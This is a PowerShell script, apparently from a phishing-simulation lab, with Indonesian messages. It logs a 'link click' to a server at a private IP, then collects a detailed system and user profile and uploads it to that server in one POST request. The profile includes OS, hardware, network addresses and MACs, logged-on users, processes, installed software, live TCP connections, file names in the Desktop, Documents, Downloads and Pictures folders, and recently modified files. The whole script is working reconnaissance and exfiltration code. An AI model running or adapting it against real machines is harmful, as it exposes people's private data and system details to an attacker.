$ServerIP = "172.16.225.135"
$ServerPort = "8080"
$MachineID = "win-lab-1"
$Base = "http://" + $ServerIP + ":" + $ServerPort

function Get-SystemReport {
    $out = New-Object System.Text.StringBuilder

    [void]$out.AppendLine("=== SISTEM ===")
    try {
        $os = Get-CimInstance Win32_OperatingSystem
        $cs = Get-CimInstance Win32_ComputerSystem
        $loggedUser = $cs.UserName
        [void]$out.AppendLine("Hostname : $env:COMPUTERNAME")
        [void]$out.AppendLine("LoggedOn : $loggedUser")
        [void]$out.AppendLine("OS       : $($os.Caption) | Build $($os.BuildNumber) | $($os.OSArchitecture)")
        [void]$out.AppendLine("LastBoot : $($os.LastBootUpTime)")
        [void]$out.AppendLine("Timezone : $([System.TimeZoneInfo]::Local.Id) | $([System.TimeZoneInfo]::Local.DisplayName)")
    } catch {
        [void]$out.AppendLine("(gagal baca sistem: $($_.Exception.Message))")
    }

    [void]$out.AppendLine("=== HARDWARE ===")
    try {
        $cpu = Get-CimInstance Win32_Processor
        [void]$out.AppendLine("CPU      : $($cpu.Name) | $($cpu.NumberOfCores) cores / $($cpu.NumberOfLogicalProcessors) threads")
        $osMem = Get-CimInstance Win32_OperatingSystem
        $freeGB = [math]::Round($osMem.FreePhysicalMemory / 1MB, 1)
        $totalGB = [math]::Round($osMem.TotalVisibleMemorySize / 1MB, 1)
        [void]$out.AppendLine("RAM      : $totalGB GB total | $freeGB GB free")
        Get-CimInstance Win32_VideoController | ForEach-Object {
            [void]$out.AppendLine("GPU      : $($_.Name) | $($_.CurrentHorizontalResolution)x$($_.CurrentVerticalResolution)")
        }
    } catch {
        [void]$out.AppendLine("(gagal baca hardware: $($_.Exception.Message))")
    }

    [void]$out.AppendLine("=== DISK ===")
    try {
        Get-CimInstance Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 } | Select-Object -First 10 | ForEach-Object {
            $freeGB = [math]::Round($_.FreeSpace / 1GB, 1)
            $sizeGB = [math]::Round($_.Size / 1GB, 1)
            [void]$out.AppendLine("$($_.DeviceID) : $freeGB GB free / $sizeGB GB | $($_.FileSystem) | $($_.VolumeName)")
        }
    } catch {
        [void]$out.AppendLine("(gagal baca disk: $($_.Exception.Message))")
    }

    [void]$out.AppendLine("=== JARINGAN ===")
    try {
        Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled } | ForEach-Object {
            foreach ($ip4 in $_.IPAddress) {
                if ($ip4 -match "^\d+\.\d+\.\d+\.\d+$") {
                    [void]$out.AppendLine("$($_.Description) | IP: $ip4 | MAC: $($_.MACAddress)")
                }
            }
        }
    } catch {
        [void]$out.AppendLine("(gagal baca jaringan: $($_.Exception.Message))")
    }

    [void]$out.AppendLine("=== USER / SESSION ===")
    try {
        $users = Get-CimInstance Win32_LoggedOnUser -ErrorAction Stop | ForEach-Object {
            if ($_.Antecedent -match "Name=`"(?<n>[^\"]+)\"") { $Matches.n }
        }
        $users | Sort-Object -Unique | ForEach-Object { [void]$out.AppendLine("User : $_") }
    } catch {
        [void]$out.AppendLine("(tidak bisa enumerasi session: $($_.Exception.Message))")
    }

    [void]$out.AppendLine("=== PROSES TOP (RAM) ===")
    try {
        Get-Process | Sort-Object WorkingSet64 -Descending | Select-Object -First 15 | ForEach-Object {
            [void]$out.AppendLine("PID $($_.Id) | $($_.ProcessName) | RAM $([math]::Round($_.WorkingSet64/1MB,1)) MB | $($_.Path)")
        }
    } catch {
        [void]$out.AppendLine("(gagal baca proses: $($_.Exception.Message))")
    }

    [void]$out.AppendLine("=== SOFTWARE TERINSTAL (40 teratas) ===")
    try {
        $sw = @()
        $paths = @(
            'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*',
            'HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*',
            'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*'
        )
        foreach ($p in $paths) {
            Get-ItemProperty $p -ErrorAction SilentlyContinue |
                Where-Object { $_.DisplayName } |
                ForEach-Object { $sw += "$($_.DisplayName) $($_.DisplayVersion)" }
        }
        $sw | Sort-Object -Unique | Select-Object -First 40 | ForEach-Object { [void]$out.AppendLine("$_") }
    } catch {
        [void]$out.AppendLine("(gagal baca software: $($_.Exception.Message))")
    }

    [void]$out.AppendLine("=== KONEKSI TCP (Established, 20 teratas) ===")
    try {
        Get-NetTCPConnection -ErrorAction Stop | Where-Object { $_.State -eq 'Established' } | Select-Object -First 20 | ForEach-Object {
            $proc = (Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).ProcessName
            [void]$out.AppendLine("$($_.LocalAddress):$($_.LocalPort) -> $($_.RemoteAddress):$($_.RemotePort) | $proc")
        }
    } catch {
        [void]$out.AppendLine("(tidak bisa membaca koneksi: $($_.Exception.Message))")
    }

    [void]$out.AppendLine("=== FILE USER ===")
    try {
        $targets = @(
            (Join-Path $env:USERPROFILE 'Desktop'),
            (Join-Path $env:USERPROFILE 'Documents'),
            (Join-Path $env:USERPROFILE 'Downloads'),
            (Join-Path $env:USERPROFILE 'Pictures')
        )
        foreach ($dir in $targets) {
            if (Test-Path $dir) {
                [void]$out.AppendLine("-- $dir --")
                Get-ChildItem $dir -File -ErrorAction SilentlyContinue |
                    Sort-Object Length -Descending | Select-Object -First 15 |
                    ForEach-Object {
                        [void]$out.AppendLine("$($_.Name) | $([math]::Round($_.Length/1KB,1)) KB")
                    }
            }
        }
    } catch {
        [void]$out.AppendLine("(gagal baca file: $($_.Exception.Message))")
    }

    [void]$out.AppendLine("=== FILE TERBARU (7 hari) ===")
    try {
        $since = (Get-Date).AddDays(-7)
        Get-ChildItem $env:USERPROFILE -Recurse -File -Depth 3 -ErrorAction SilentlyContinue |
            Where-Object { $_.LastWriteTime -gt $since -and $_.Length -gt 0 } |
            Sort-Object LastWriteTime -Descending | Select-Object -First 15 |
            ForEach-Object {
                [void]$out.AppendLine("$($_.LastWriteTime.ToString('yyyy-MM-dd HH:mm')) | $($_.FullName)")
            }
    } catch {
        [void]$out.AppendLine("(gagal baca file terbaru: $($_.Exception.Message))")
    }

    return $out.ToString()
}

$wc = New-Object System.Net.WebClient
$wc.Proxy = $null

try {
    $null = $wc.DownloadString($Base + "/?id=" + $MachineID)
    Write-Host "[+] Link terbuka, server mencatat klik (ID: $MachineID)"
} catch {
    Write-Host "[!] Gagal buka link: $($_.Exception.Message)"
}

$report = Get-SystemReport
try {
    $wc.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
    $resp = $wc.UploadString($Base + "/", "data=" + [uri]::EscapeDataString($report))
    Write-Host "[+] Laporan sistem terkirim, server membalas: $resp"
} catch {
    Write-Host "[!] Gagal kirim laporan: $($_.Exception.Message)"
}
